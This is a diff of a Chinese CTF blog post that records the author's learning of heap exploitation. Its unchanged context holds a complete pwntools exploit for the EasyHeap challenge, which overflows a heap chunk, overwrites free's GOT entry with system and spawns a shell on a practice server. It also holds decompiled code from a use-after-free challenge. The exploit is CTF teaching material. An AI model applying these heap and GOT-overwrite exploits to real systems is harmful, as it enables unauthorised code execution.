@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="现在开始学堆，听说heap比stack难多了，于是我想记录一下学习记录，然后再总结一下  记录一下第一个写的heap题 [ZJCTF 2019]EasyHeap 什么都不懂，看wp，说在edit有一个堆溢出    ​     思路：  exp 123456789101112131415161718192021222324252627282930313233343536373839404142434">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ctfshow141.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png">
+<meta property="og:image" content="http://linkpwn.github.io/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png">
+<meta property="og:image" content="http://linkpwn.github.io/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ctfshow141.1.png">
 <meta property="article:published_time" content="2025-03-15T05:52:59.000Z">
-<meta property="article:modified_time" content="2025-09-25T00:14:20.023Z">
+<meta property="article:modified_time" content="2025-09-25T00:14:20.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
@@ -106,7 +106,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -200,7 +200,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -265,9 +265,9 @@
 <p>什么都不懂，看wp，说在edit有一个堆溢出</p>
 </li>
 </ol>
-<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png" alt="1"></p>
+<p><img src="/./heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png" alt="1"></p>
 <p>​     思路：</p>
-<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png" alt="2"></p>
+<p><img src="/./heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png" alt="2"></p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io=process(&quot;easyheap&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29842</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> +<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">payload3=p64(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -551,7 +551,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如第一次申请16字节的内存chunk1，free(释放)后，如果指针没有指向NULL，free只能把chunk放入bin，但是指针还是指向堆块的。</span><br><span class="line">此时我们只要再次申请和上个堆块一样的内存大小，此时就会把上次的chunk1的内存风给我们了，称后申请为chunk2，此时我们修改chunk2就是在改chunk1了。</span><br></pre></td></tr></table></figure></li>
 </ol>
 <p>主函数：</p>
-<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ctfshow141.1.png" alt="2"></p>
+<p><img src="/./heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ctfshow141.1.png" alt="2"></p>
 <p>print_note():</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned <span class="built_in">int</span> print_note()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )</span><br><span class="line">    (**((void (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -785,7 +785,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
